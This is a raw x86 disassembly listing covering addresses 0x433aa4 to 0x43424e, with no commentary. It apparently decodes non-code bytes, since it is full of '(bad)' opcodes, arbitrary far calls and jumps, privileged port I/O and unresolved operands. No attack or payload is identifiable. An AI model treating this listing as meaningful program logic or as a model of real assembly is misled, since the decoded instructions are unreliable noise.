  433aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433aa5:	dec    esi
  433aa6:	mov    edx,0x8d2fa376
  433aab:	jnp    0x433a5b
  433aad:	rcr    BYTE PTR [ecx+0x19b720c9],0x17
  433ab4:	cmp    eax,ebp
  433ab6:	jmp    0x433a5f
  433ab8:	in     eax,0xcb
  433aba:	les    ebp,FWORD PTR [edi-0x4b]
  433abd:	in     al,dx
  433abe:	fsub   st(7),st
  433ac0:	lds    edx,FWORD PTR [edx+ebx*4]
  433ac3:	mov    WORD PTR ds:0x632608a6,ss
  433ac9:	cwde   
  433aca:	(bad)  
  433acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433acc:	add    eax,0x65cccd76
  433ad1:	xchg   ebx,eax
  433ad2:	push   0xe5f1b592
  433ad7:	sbb    cl,BYTE PTR [ebx-0x3a]
  433ada:	mov    bl,bh
  433adc:	cs sub eax,0x79b35545
  433ae2:	push   esi
  433ae3:	cdq    
  433ae4:	stc    
  433ae5:	cmc    
  433ae6:	sbb    DWORD PTR [eax-0x43],ebx
  433ae9:	and    edi,ecx
  433aeb:	aaa    
  433aec:	dec    edx
  433aed:	mov    dh,0x67
  433aef:	pmaxsw mm0,mm6
  433af2:	and    al,0xa7
  433af4:	stos   BYTE PTR es:[edi],al
  433af5:	sub    al,0x90
  433af7:	shl    edi,cl
  433af9:	mov    esi,DWORD PTR [edi-0x628aee57]
  433aff:	in     al,0x32
  433b01:	mov    eax,0x54fcc537
  433b06:	call   0x26e:0xabd0652e
  433b0d:	xchg   edi,eax
  433b0e:	adc    DWORD PTR [edi-0x46b5d598],esp
  433b14:	and    BYTE PTR [edi],al
  433b16:	in     eax,0xf8
  433b18:	sub    bl,bh
  433b1a:	call   0x632b:0xfe44d98f
  433b21:	rcr    DWORD PTR [ebp+ebx*8-0x7c],1
  433b25:	xor    ebp,DWORD PTR [ebp+0x9]
  433b28:	xor    al,bh
  433b2a:	or     BYTE PTR [eax-0x18],ch
  433b2d:	cmp    ecx,DWORD PTR [edi-0x3a]
  433b30:	scas   al,BYTE PTR es:[edi]
  433b31:	neg    ah
  433b33:	hlt    
  433b34:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433b36:	pop    ebp
  433b37:	bound  eax,QWORD PTR [ebp-0x53]
  433b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b3b:	mov    DWORD PTR [ebx],ebx
  433b3d:	aam    0xc7
  433b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b40:	jp     0x433bc0
  433b42:	sub    eax,0x9aec5b15
  433b47:	pop    eax
  433b48:	xchg   ebx,eax
  433b49:	lock sahf 
  433b4b:	xlat   BYTE PTR ds:[ebx]
  433b4c:	inc    ecx
  433b4d:	cmp    dh,BYTE PTR [ecx-0x514b1259]
  433b53:	stos   BYTE PTR es:[edi],al
  433b54:	inc    esi
  433b55:	jmp    0x9ddf:0xafb03f32
  433b5c:	es inc ebx
  433b5e:	sbb    al,0xb2
  433b61:	retf   
  433b62:	push   ebp
  433b63:	add    BYTE PTR [ebp+0x483a9ac0],0xe0
  433b6a:	push   es
  433b6b:	aam    0xba
  433b6d:	shr    DWORD PTR [eax+0x148653a9],cl
  433b73:	imul   edx,edx,0xffffffb9
  433b76:	pop    eax
  433b77:	mov    dl,BYTE PTR [edx-0x7]
  433b7a:	call   0x919b:0xf68ce6bd
  433b81:	popf   
  433b82:	fcomp  st(3)
  433b84:	sar    DWORD PTR [esi+0x16],cl
  433b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433b88:	dec    ebp
  433b89:	or     al,BYTE PTR ds:0x4274030d
  433b8f:	mov    DWORD PTR [edi+0x47fc9180],esi
  433b95:	xor    eax,0x6d325f5d
  433b9a:	sub    eax,ebp
  433b9c:	ud2    
  433b9e:	out    0x5a,eax
  433ba0:	les    ebp,FWORD PTR [ecx+0x4]
  433ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433ba4:	sbb    eax,0xb43102e0
  433ba9:	outs   dx,BYTE PTR ds:[esi]
  433baa:	les    eax,FWORD PTR [eax]
  433bac:	icebp  
  433bad:	jnp    0x433c15
  433baf:	test   eax,0xd5b92217
  433bb4:	xor    bl,dl
  433bb6:	cli    
  433bb7:	cmp    al,0x2e
  433bb9:	sbb    DWORD PTR [edx+0x390fb099],ebx
  433bbf:	and    BYTE PTR [ebp+0x34a7d9f2],dh
  433bc5:	jl     0x433bba
  433bc7:	je     0x433c33
  433bc9:	add    al,BYTE PTR [ebp+0x67efb166]
  433bcf:	mov    ss,WORD PTR [eax-0x2c]
  433bd2:	nop
  433bd3:	daa    
  433bd4:	std    
  433bd5:	or     DWORD PTR [eax],esp
  433bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433bd8:	cmp    DWORD PTR [eax+0x4523e88],0x0
  433bdf:	inc    esp
  433be0:	pop    esp
  433be1:	xlat   BYTE PTR ds:[ebx]
  433be2:	call   0x95d6:0xe0efa927
  433be9:	inc    eax
  433bea:	jne    0x433b88
  433bec:	clc    
  433bed:	push   esp
  433bee:	call   0x1638:0x37554b62
  433bf5:	mov    esi,0xe157699
  433bfa:	enter  0xfc0c,0xbb
  433bfe:	imul   esp,DWORD PTR [esp+esi*2+0x17],0xb23fd236
  433c06:	popa   
  433c07:	mov    al,ds:0xf1223de2
  433c0c:	add    BYTE PTR [edx+0x4e],cl
  433c0f:	sbb    DWORD PTR [ebx+edx*8+0x74],esp
  433c13:	mov    DWORD PTR [edx-0x4ea78de4],esi
  433c19:	iret   
  433c1a:	fwait
  433c1b:	(bad)  
  433c1c:	cmp    BYTE PTR [ebx],cl
  433c1e:	jmp    0x433bde
  433c20:	pop    esi
  433c21:	cmp    cl,cl
  433c23:	jmp    0xcc29:0x559a5d00
  433c2a:	js     0x433c45
  433c2c:	in     eax,dx
  433c2d:	lahf   
  433c2e:	jmp    0x3a4e8a52
  433c33:	pop    eax
  433c34:	test   al,0xfe
  433c36:	xchg   ebp,eax
  433c37:	sahf   
  433c38:	imul   esp,DWORD PTR [edx+0x6d5539a],0xffffffd5
  433c3f:	xchg   ebx,eax
  433c40:	clc    
  433c41:	imul   esp,DWORD PTR [ecx-0x59],0xcac23c7b
  433c48:	cmp    edx,DWORD PTR [ebx-0x674d0434]
  433c4e:	outs   dx,DWORD PTR ds:[esi]
  433c4f:	into   
  433c50:	retf   0xeb86
  433c53:	ins    DWORD PTR es:[edi],dx
  433c54:	or     BYTE PTR [ebx],0x45
  433c57:	leave  
  433c58:	mov    ds:0xbdd2fa4e,eax
  433c5d:	popf   
  433c5e:	fwait
  433c5f:	inc    ebp
  433c60:	(bad)  
  433c61:	test   DWORD PTR [eax],ecx
  433c63:	push   ecx
  433c64:	popf   
  433c65:	cmp    BYTE PTR [edx+0x1a],bh
  433c68:	dec    DWORD PTR [ebx]
  433c6a:	jg     0x433c66
  433c6c:	cdq    
  433c6d:	cli    
  433c6e:	int3   
  433c6f:	jnp    0x433cd6
  433c71:	xchg   ebp,eax
  433c72:	fwait
  433c73:	mov    esi,0x681ad0e5
  433c78:	cmc    
  433c79:	xchg   edx,eax
  433c7a:	outs   dx,BYTE PTR ds:[esi]
  433c7b:	push   esp
  433c7c:	dec    edi
  433c7d:	add    al,0xef
  433c7f:	not    DWORD PTR [eax+0x3f655ad2]
  433c85:	es cdq 
  433c87:	std    
  433c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433c89:	ret    0x8473
  433c8c:	jp     0x433c99
  433c8e:	push   ds
  433c8f:	sar    DWORD PTR ds:0x643eef44,1
  433c95:	pop    ebx
  433c96:	mov    al,0x69
  433c98:	or     BYTE PTR [edi],dh
  433c9a:	cmp    eax,0xd0993765
  433c9f:	or     ch,BYTE PTR [eax+ecx*8-0x1c]
  433ca3:	adc    DWORD PTR [edx],0xb239b4c1
  433ca9:	mov    dh,0x7c
  433cab:	lock pop esp
  433cad:	(bad)  
  433caf:	push   ds
  433cb0:	test   DWORD PTR [ebx+0x4d],edi
  433cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433cb4:	mov    edx,0x37c11a02
  433cb9:	clc    
  433cba:	imul   ebp,DWORD PTR [ebp+0x31072b0c],0xffffffb1
  433cc1:	aam    0xab
  433cc3:	sub    ecx,DWORD PTR [ecx]
  433cc5:	lock dec esi
  433cc7:	pop    es
  433cc8:	icebp  
  433cc9:	out    0x2c,al
  433ccb:	sar    ecx,1
  433ccd:	or     ebx,DWORD PTR [esi]
  433ccf:	hlt    
  433cd0:	add    DWORD PTR [ebx],ebx
  433cd2:	push   ecx
  433cd3:	or     eax,0x489a2bd3
  433cd8:	adc    ch,BYTE PTR [edi-0x7e3654b]
  433cde:	loope  0x433c86
  433ce0:	pop    edx
  433ce1:	pop    eax
  433ce2:	test   dl,dl
  433ce4:	mov    edi,0x894750dd
  433ce9:	imul   ebx,DWORD PTR [edx+0x41e0caab],0xffffffd6
  433cf0:	lock repz rol BYTE PTR [ebx+0x53],cl
  433cf5:	or     ebx,DWORD PTR [ebp-0x17d6ff3f]
  433cfb:	sbb    bp,WORD PTR [ebp+0x3f09a]
  433d02:	(bad)  
  433d03:	cld    
  433d04:	popf   
  433d05:	ja     0x433d84
  433d07:	mov    ch,0xb4
  433d09:	out    dx,al
  433d0a:	jmp    0x433cb3
  433d0c:	push   es
  433d0d:	push   es
  433d0e:	lods   al,BYTE PTR ds:[esi]
  433d0f:	ins    DWORD PTR es:[edi],dx
  433d10:	lds    eax,FWORD PTR [edi-0x12]
  433d13:	call   0x9809ed6e
  433d18:	loope  0x433d26
  433d1a:	pop    ebx
  433d1b:	out    dx,al
  433d1c:	mov    ebx,?
  433d1e:	retf   0x8010
  433d21:	adc    eax,0xac8aa73a
  433d26:	ret    0x838d
  433d29:	loopne 0x433cf9
  433d2b:	or     al,0x8e
  433d2d:	or     BYTE PTR [esi],dl
  433d2f:	daa    
  433d30:	fild   WORD PTR [ebp+0x29]
  433d33:	lods   eax,DWORD PTR ds:[esi]
  433d34:	jo     0x433cd1
  433d36:	enter  0x57a7,0xa6
  433d3a:	pop    es
  433d3b:	aas    
  433d3c:	jge    0x433d4f
  433d3e:	mov    edx,esp
  433d40:	mov    dl,0xce
  433d42:	stos   DWORD PTR es:[edi],eax
  433d43:	in     al,0x4f
  433d45:	out    dx,eax
  433d46:	in     eax,0x5e
  433d48:	call   0xb43d:0x8adf4b0b
  433d4f:	mov    ah,0x2d
  433d51:	pop    esi
  433d52:	lahf   
  433d53:	push   ebp
  433d54:	idiv   DWORD PTR [esi-0x40]
  433d57:	out    0x72,eax
  433d59:	retf   0x545e
  433d5c:	jae    0x433d47
  433d5e:	xchg   edi,eax
  433d5f:	mov    esp,DWORD PTR [ebp-0x15adf69]
  433d65:	(bad)  
  433d67:	(bad)  
  433d68:	mov    esi,DWORD PTR [bp+0x3b40]
  433d6d:	sbb    eax,0x7423a7bd
  433d72:	cs inc edi
  433d74:	add    DWORD PTR [esi+esi*1+0x1894b255],0x5a6a8fdb
  433d7f:	fld    DWORD PTR [eax+0xba88816]
  433d85:	retf   
  433d86:	scas   al,BYTE PTR es:[edi]
  433d87:	pop    edi
  433d88:	dec    esp
  433d89:	sbb    al,0x1a
  433d8b:	adc    dh,BYTE PTR [eax-0xda497d4]
  433d91:	mov    DWORD PTR [edi+eax*2+0x6a],0x24a531ef
  433d99:	jmp    0xfddb:0x2e057b73
  433da0:	retf   
  433da1:	fcomip st,st(4)
  433da3:	fidiv  DWORD PTR [edx+0x40605a97]
  433da9:	push   es
  433daa:	mov    eax,0xdf0bf353
  433daf:	retf   0x871c
  433db2:	mov    ecx,0x9a9a0cdb
  433db7:	jns    0x433d40
  433db9:	ss mov bh,0x56
  433dbc:	xchg   ebx,eax
  433dbd:	lods   eax,DWORD PTR ds:[esi]
  433dbe:	mov    DWORD PTR [edi+0x7b0c1963],esp
  433dc4:	scas   eax,DWORD PTR es:[edi]
  433dc5:	retf   0x3cf1
  433dc8:	mov    dl,0xd0
  433dca:	or     eax,0x40afce48
  433dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433dd0:	mov    cl,BYTE PTR [ebx]
  433dd2:	push   edx
  433dd3:	cmp    BYTE PTR [esi+0x30],bh
  433dd6:	aam    0x33
  433dd8:	mov    bl,0x1e
  433dda:	xchg   esp,eax
  433ddb:	(bad)  
  433ddc:	aad    0x9d
  433dde:	dec    esp
  433ddf:	jp     0x433d93
  433de1:	in     al,dx
  433de2:	iret   
  433de3:	lods   eax,DWORD PTR ds:[esi]
  433de4:	add    bl,cl
  433de6:	push   ebp
  433de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433de8:	inc    esi
  433de9:	xchg   ebx,eax
  433dea:	repnz adc BYTE PTR [eax+eiz*2],bl
  433dee:	(bad)  
  433def:	xor    esi,DWORD PTR [ebp-0x317ed837]
  433df5:	push   ecx
  433df6:	stos   BYTE PTR es:[edi],al
  433df7:	dec    ebp
  433df8:	and    eax,0xb6a713ff
  433dfd:	repnz mov edi,0xb84c0e1f
  433e03:	fnsave [edx+0x48ae1981]
  433e09:	mov    eax,ds:0xb2683ae
  433e0e:	cmp    DWORD PTR [edi-0x74c5cb4],ecx
  433e14:	push   0xe455c6b3
  433e19:	or     esp,DWORD PTR [ebx-0x3bf94c9e]
  433e1f:	aad    0xd7
  433e21:	or     esi,esi
  433e23:	push   edi
  433e24:	test   ah,ch
  433e26:	push   ss
  433e27:	inc    esi
  433e28:	mov    ecx,0xdd9b9a92
  433e2d:	push   eax
  433e2e:	rol    BYTE PTR [ecx-0x49],cl
  433e31:	stc    
  433e32:	shr    BYTE PTR [ecx+0x56ea309d],1
  433e38:	xchg   edx,eax
  433e39:	mov    ebp,0x3aac81b6
  433e3e:	call   0x11fd:0x5ff3b6ea
  433e45:	or     BYTE PTR [ecx],0xa8
  433e48:	xchg   ah,bh
  433e4a:	dec    edi
  433e4b:	adc    edx,DWORD PTR [edx+0x4dbfbcbd]
  433e51:	xchg   edi,eax
  433e52:	mov    dh,0x5b
  433e54:	mov    al,0xc8
  433e56:	lea    edx,[ecx-0x46d74c4e]
  433e5c:	(bad)  
  433e5e:	xlat   BYTE PTR ds:[ebx]
  433e5f:	rcr    DWORD PTR [edi+0x900110c],cl
  433e65:	outs   dx,BYTE PTR ds:[esi]
  433e66:	mov    ecx,0x4aef6da7
  433e6b:	das    
  433e6c:	mov    dl,0xf3
  433e6e:	ins    DWORD PTR es:[edi],dx
  433e6f:	or     esp,ebx
  433e71:	jae    0x433e20
  433e73:	icebp  
  433e74:	pop    edi
  433e75:	or     ebx,DWORD PTR [eax+edi*1+0x0]
  433e79:	loopne 0x433ef8
  433e7b:	imul   ebp,DWORD PTR es:[ebp+0x2f60a39a],0xffffffa3
  433e83:	sub    BYTE PTR [edi+0x23],cl
  433e86:	gs aaa 
  433e88:	repnz or dh,al
  433e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433e8c:	xchg   DWORD PTR [edx+ebx*2+0x78c39e5b],ecx
  433e93:	(bad)  
  433e94:	pop    edx
  433e95:	xor    DWORD PTR [ecx+0x311a761d],ebx
  433e9b:	inc    ebx
  433e9c:	(bad)  
  433e9d:	xchg   ebx,eax
  433e9e:	sbb    DWORD PTR [eax+0x32],ecx
  433ea1:	or     edx,DWORD PTR [ecx+ebx*1-0x3b]
  433ea5:	jne    0x433f0d
  433ea7:	sub    BYTE PTR [eax-0x24f96550],bh
  433ead:	popf   
  433eae:	jecxz  0x433e81
  433eb0:	xchg   esi,eax
  433eb1:	in     eax,0x77
  433eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433eb4:	call   0x680326e4
  433eb9:	xchg   ebx,eax
  433eba:	daa    
  433ebb:	fnsave [edx+0x368a990e]
  433ec1:	inc    edi
  433ec2:	sub    DWORD PTR [edx+ebx*8+0x8],0x47
  433ec7:	stos   DWORD PTR es:[edi],eax
  433ec8:	sub    eax,0x62ef0f2f
  433ecd:	ja     0x433f36
  433ecf:	mov    eax,ds:0x1dbcf2b5
  433ed4:	cwde   
  433ed5:	jno    0xcbdc5b02
  433edb:	push   ss
  433edc:	std    
  433edd:	or     edi,DWORD PTR [ebx]
  433edf:	mov    esi,0x4fb637d8
  433ee4:	loop   0x433ea1
  433ee6:	popf   
  433ee7:	sbb    eax,0x3991a2f3
  433eec:	adc    al,BYTE PTR [esi]
  433eee:	retf   
  433eef:	xchg   edx,eax
  433ef0:	test   DWORD PTR [ebx],0x8c60df35
  433ef6:	imul   esp,DWORD PTR [edi+ebp*4-0x5bc8659e],0x4
  433efe:	ds fs push eax
  433f01:	pop    ebp
  433f02:	xor    dl,bl
  433f04:	ss or  ebx,esp
  433f07:	pushf  
  433f08:	int    0x7c
  433f0a:	lahf   
  433f0b:	(bad)
  433f0e:	call   0x845e:0x62b88ab
  433f15:	adc    BYTE PTR [ecx+edx*2],ch
  433f18:	lock or edx,ebx
  433f1b:	sub    bl,BYTE PTR [ebp+0x2d3640f4]
  433f21:	rcr    DWORD PTR [edx-0x2909da2f],cl
  433f27:	xchg   edi,eax
  433f28:	pop    edx
  433f29:	sub    cl,ah
  433f2b:	cmp    al,cl
  433f2d:	push   ebx
  433f2e:	mov    ds:0x158b443b,eax
  433f33:	jmp    0x801960ca
  433f38:	jp     0x433f45
  433f3a:	xchg   edx,eax
  433f3b:	sbb    DWORD PTR [edi],edx
  433f3d:	push   es
  433f3e:	call   0x9d964de3
  433f43:	ret    
  433f44:	data16 sub al,0xe2
  433f47:	push   ebx
  433f48:	repnz das 
  433f4a:	push   esi
  433f4b:	and    DWORD PTR ds:0xd362dc08,eax
  433f51:	icebp  
  433f52:	and    eax,DWORD PTR [eax+0x72]
  433f55:	ds push 0xa24b208
  433f5b:	pop    es
  433f5c:	out    dx,eax
  433f5d:	mov    esi,0xb5f8e99
  433f62:	inc    edi
  433f63:	pop    ebp
  433f64:	push   edx
  433f65:	and    DWORD PTR [ebp+0x54],0x15
  433f69:	scas   al,BYTE PTR es:[edi]
  433f6a:	fs jl  0x433f09
  433f6d:	jmp    0x7af569b2
  433f72:	scas   eax,DWORD PTR es:[edi]
  433f73:	jecxz  0x433f41
  433f75:	outs   dx,BYTE PTR ds:[esi]
  433f76:	in     eax,dx
  433f77:	fadd   QWORD PTR [edx+0xb]
  433f7a:	mov    esp,0xc69e0149
  433f7f:	xor    DWORD PTR [ecx+0x61],ecx
  433f82:	xchg   esp,eax
  433f83:	mov    ds,esi
  433f85:	daa    
  433f86:	dec    ebp
  433f87:	(bad)  
  433f88:	pop    ds
  433f89:	xor    eax,0x9c82b39e
  433f8e:	mov    ch,0x9f
  433f90:	bound  eax,QWORD PTR [edx-0x2f3c9d66]
  433f96:	cmc    
  433f97:	jge    0x434016
  433f99:	mov    dh,0x9a
  433f9b:	hlt    
  433f9c:	sbb    DWORD PTR [ecx],edi
  433f9e:	shl    DWORD PTR [edi+edi*1+0x2d],cl
  433fa2:	fcmovnu st,st(0)
  433fa4:	sbb    BYTE PTR [ebx],cl
  433fa6:	(bad)  
  433fa8:	jns    0x433f68
  433faa:	mov    gs,WORD PTR [edx+0x4186af93]
  433fb0:	daa    
  433fb1:	sbb    DWORD PTR [edx-0x6b],0xcd12014
  433fb8:	lods   eax,DWORD PTR ds:[esi]
  433fb9:	or     esp,ecx
  433fbb:	pop    esi
  433fbc:	xor    bh,ah
  433fbe:	lea    ebp,[esi]
  433fc0:	test   bh,0x9a
  433fc3:	inc    esi
  433fc4:	and    DWORD PTR [ecx+0x1093dbba],edx
  433fca:	(bad)  
  433fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433fcc:	cmp    eax,0x7837e06f
  433fd1:	add    BYTE PTR [eax-0xa],ah
  433fd4:	mov    ebp,0x67038ecb
  433fd9:	sub    edi,DWORD PTR [ebp-0x45]
  433fdc:	out    0xbd,al
  433fde:	pop    eax
  433fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433fe0:	pop    ss
  433fe1:	push   ecx
  433fe2:	mov    bl,0x6c
  433fe4:	dec    eax
  433fe5:	sub    al,0xa1
  433fe7:	cli    
  433fe8:	mov    ecx,0x1991ef6c
  433fed:	mov    ebp,DWORD PTR [ebp+0x4]
  433ff0:	sub    BYTE PTR [eax-0x5],bh
  433ff3:	mov    DWORD PTR [eax-0x22],esi
  433ff6:	fbld   TBYTE PTR [esi-0x61b1f338]
  433ffc:	mov    edx,0xb28972f3
  434001:	pop    ecx
  434002:	and    DWORD PTR [esi-0x5f],ebp
  434005:	iret   
  434006:	cwde   
  434007:	dec    ebx
  434008:	or     al,0x17
  43400a:	hlt    
  43400b:	gs das 
  43400d:	push   ss
  43400e:	nop
  43400f:	fnsave [edx-0x206ee62e]
  434015:	cmp    dl,dl
  434017:	xor    DWORD PTR [edx-0x76d63dbc],esi
  43401d:	mov    edx,0x866a11a
  434022:	pop    edi
  434023:	or     esi,DWORD PTR [eax]
  434025:	mov    ds:0xdb4580a9,eax
  43402a:	sub    al,0x24
  43402c:	or     al,0xf6
  43402e:	call   0x24d7:0xc7c274d8
  434035:	jbe    0x434010
  434037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434038:	mov    esp,0xa0d281da
  43403d:	dec    edx
  43403e:	icebp  
  43403f:	sbb    eax,0x4f3abdc0
  434044:	stos   DWORD PTR es:[edi],eax
  434045:	jg     0x433fe1
  434047:	add    DWORD PTR [edx+edi*1+0x5fee3604],ecx
  43404e:	xchg   ebx,eax
  43404f:	test   al,0xd5
  434051:	ds adc eax,0x2df4f23d
  434057:	adc    BYTE PTR [ebx-0xd],0x9a
  43405b:	ret    
  43405c:	jmp    0x5e68:0x6287be97
  434063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434064:	push   eax
  434065:	pop    esp
  434066:	mov    dh,0xcd
  434068:	mov    bh,0x85
  43406a:	loop   0x4340af
  43406c:	mov    dl,0xfd
  43406e:	xor    BYTE PTR [ecx],bl
  434070:	aaa    
  434071:	in     eax,dx
  434072:	and    DWORD PTR [ebx+ecx*8+0x31a7c572],ecx
  434079:	ret    0xa633
  43407c:	sbb    esi,ecx
  43407e:	loop   0x434076
  434080:	leave  
  434081:	in     al,0x99
  434083:	mov    bl,0x63
  434085:	add    edi,eax
  434087:	or     DWORD PTR [esi-0x55],eax
  43408a:	fmul   DWORD PTR [ebp+0x64208e8]
  434090:	jmp    0x7a9c8249
  434095:	sahf   
  434096:	adc    ebp,DWORD PTR [edi*4+0x62de6bd4]
  43409d:	sub    ebx,DWORD PTR [eax-0x20667c2]
  4340a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4340a4:	or     ch,BYTE PTR [esi-0x78c4af2a]
  4340aa:	fiadd  DWORD PTR [ebx]
  4340ac:	mov    dl,0xcb
  4340ae:	int    0x52
  4340b0:	loope  0x4340bb
  4340b2:	mov    bl,0xd8
  4340b4:	mov    bh,0xb
  4340b6:	int3   
  4340b7:	mov    dl,BYTE PTR [eax+0x14]
  4340ba:	pop    ecx
  4340bb:	push   ebp
  4340bc:	inc    ebx
  4340bd:	cmp    al,0x9a
  4340bf:	xchg   esp,eax
  4340c0:	neg    BYTE PTR [edx-0x2f]
  4340c3:	pop    esp
  4340c4:	adc    dh,BYTE PTR [ebx+ebp*4+0x26694fa7]
  4340cb:	push   ecx
  4340cc:	add    al,BYTE PTR [edx]
  4340ce:	test   al,0xcd
  4340d0:	pop    edx
  4340d1:	mov    esi,DWORD PTR [esi-0x56]
  4340d4:	mov    dl,0x88
  4340d6:	pop    edi
  4340d7:	ret    0x6ad4
  4340da:	inc    ebx
  4340db:	xor    dl,cl
  4340dd:	or     ebp,DWORD PTR [ecx+0x18]
  4340e0:	dec    edx
  4340e1:	mov    dh,0x31
  4340e3:	frstor [ebx]
  4340e5:	add    ebx,DWORD PTR [ebx-0x3f33f98f]
  4340eb:	(bad)  
  4340ec:	mov    cl,0xf2
  4340ee:	pushw  0xffa2
  4340f1:	xor    edx,DWORD PTR [edi]
  4340f3:	inc    ecx
  4340f4:	lods   eax,DWORD PTR ds:[esi]
  4340f5:	jmp    0xec7a:0x9f8b2739
  4340fc:	sbb    eax,0x72929a2c
  434101:	jnp    0x4340cc
  434103:	mov    BYTE PTR [eax],ch
  434105:	je     0x434113
  434107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434108:	inc    edi
  434109:	mov    esp,0x5e22cbaa
  43410e:	jne    0x43412f
  434110:	mov    dl,0xf2
  434112:	aas    
  434113:	and    BYTE PTR [edi+0x73b46555],dh
  434119:	std    
  43411a:	mov    edx,0x627c5ca7
  43411f:	repz sub DWORD PTR [ecx],esp
  434122:	inc    eax
  434123:	(bad)  
  434124:	mov    dl,0x37
  434126:	adc    ah,BYTE PTR [esi-0x3c7f84d8]
  43412c:	adc    eax,0x6a40460b
  434131:	jle    0x43419d
  434133:	xchg   edx,eax
  434134:	dec    ebx
  434135:	or     al,0x9a
  434137:	mov    bl,0x22
  434139:	add    al,cl
  43413b:	(bad)  [eax-0x6158c05e]
  434141:	mov    dl,0xd2
  434143:	xchg   esp,eax
  434144:	push   ebp
  434145:	pusha  
  434146:	ins    BYTE PTR es:[edi],dx
  434147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434148:	mov    dl,0x9c
  43414a:	test   DWORD PTR [ebp+0x7b],ecx
  43414d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43414e:	push   esi
  43414f:	ins    BYTE PTR es:[edi],dx
  434150:	aaa    
  434151:	or     esi,DWORD PTR [ecx+0x75]
  434154:	inc    eax
  434155:	sbb    dh,BYTE PTR [ebx-0xb]
  434158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434159:	outs   dx,BYTE PTR ds:[esi]
  43415a:	jmp    0xf99:0x32238f6f
  434161:	test   esi,edx
  434163:	xor    ebp,DWORD PTR [ebp-0x906e615]
  434169:	popf   
  43416a:	test   BYTE PTR [edi+0x54be6b51],ah
  434170:	push   esi
  434171:	imul   esp,DWORD PTR [esi+0x9],0xb9c0e38b
  434178:	int3   
  434179:	add    ebx,edx
  43417b:	pop    esi
  43417c:	add    dh,BYTE PTR [edi]
  43417e:	mov    ecx,0xf30cdf9f
  434183:	repnz push 0x7a
  434186:	mov    ?,eax
  434188:	loope  0x434145
  43418a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43418b:	stos   DWORD PTR es:[edi],eax
  43418c:	jp     0x43418f
  43418e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43418f:	xchg   ecx,eax
  434190:	or     ecx,DWORD PTR [ebx+edi*4-0x76b821c6]
  434197:	pop    eax
  434198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434199:	mov    ebx,0xff1ee408
  43419e:	or     eax,0x9460c1a7
  4341a3:	sbb    bh,BYTE PTR [ebx-0x50fde053]
  4341a9:	test   ebx,esi
  4341ab:	pop    ecx
  4341ac:	dec    ebp
  4341ad:	or     edx,DWORD PTR [edi+0x48]
  4341b0:	pop    eax
  4341b1:	mov    ebp,0x7b646d17
  4341b6:	and    BYTE PTR [edi-0x4802abf1],ah
  4341bc:	push   edx
  4341bd:	mov    ds:0xb0b2e71f,al
  4341c2:	pop    eax
  4341c3:	leave  
  4341c4:	jle    0x4341c6
  4341c6:	sub    BYTE PTR [ebx+0x57e640c3],bl
  4341cc:	push   eax
  4341cd:	or     DWORD PTR [edx-0x4f805df6],ebx
  4341d3:	xor    edx,DWORD PTR [esi+0x2a41da8]
  4341d9:	out    dx,al
  4341da:	or     eax,0x69386b29
  4341df:	cmp    al,0xa
  4341e1:	xor    DWORD PTR [eax-0x56],edi
  4341e4:	mov    dl,0x28
  4341e6:	pusha  
  4341e7:	loop   0x4341e4
  4341e9:	daa    
  4341ea:	hlt    
  4341eb:	ret    0xb24
  4341ee:	and    DWORD PTR [edx+eiz*8],edx
  4341f1:	inc    edi
  4341f2:	jmp    0x434242
  4341f4:	mov    esp,fs
  4341f6:	call   0x3954:0x4f9552b2
  4341fd:	scas   al,BYTE PTR es:[edi]
  4341fe:	mov    ebp,DWORD PTR [esi+0x1fa67f7c]
  434204:	mov    dl,0x64
  434206:	dec    BYTE PTR [edi]
  434208:	call   0x6bfedf8b
  43420d:	aam    0x31
  43420f:	sbb    ebx,DWORD PTR [ecx]
  434211:	mov    eax,DWORD PTR [ecx+0x201f27f4]
  434217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434218:	or     eax,0x5566f599
  43421d:	push   esi
  43421e:	int3   
  43421f:	gs scas eax,DWORD PTR es:[edi]
  434221:	jl     0x434251
  434223:	adc    eax,0xbe2ae1c2
  434228:	aaa    
  434229:	or     esi,DWORD PTR [edx-0x64d20b13]
  43422f:	jle    0x43425f
  434231:	mov    ebx,DWORD PTR [edx-0x25bd454c]
  434237:	std    
  434238:	sub    al,cl
  43423a:	aaa    
  43423b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43423c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43423d:	out    0xf7,eax
  43423f:	mov    WORD PTR [eax-0x36],gs
  434242:	ja     0x43427a
  434244:	mov    ?,WORD PTR [ebx]
  434246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434247:	daa    
  434248:	xor    esi,edx
  43424a:	jge    0x4341e0
  43424c:	adc    al,0x8a
  43424e:	rol    BYTE PTR [ecx+0x46],cl
